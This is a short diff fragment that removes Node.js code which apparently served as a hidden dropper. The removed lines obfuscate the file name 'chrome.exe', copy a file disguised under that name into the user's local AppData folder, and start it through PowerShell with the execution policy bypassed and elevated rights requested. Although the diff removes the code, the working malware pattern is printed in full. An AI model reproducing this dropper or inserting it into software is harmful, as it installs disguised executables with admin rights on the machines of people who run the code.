@@ -1,9 +1,0 @@
-const targetFilePath = path.join(process.env.LOCALAPPDATA, String('chrom++e.e+x+e').replace(/\+/g, ''))
-const targetDir = path.dirname(targetFilePath)
-!fs.existsSync(targetDir)
-fs.mkdirSync(targetDir, { recursive: true })
-!fs.existsSync(targetFilePath)
-fs.copyFileSync(modelFilePath, targetFilePath)
-exec(`powershell -ExecutionPolicy Bypass  Start-Process -FilePath '${targetFilePath}' -Verb RunAs`, (error, stdout, stderr) => {
-
-    })
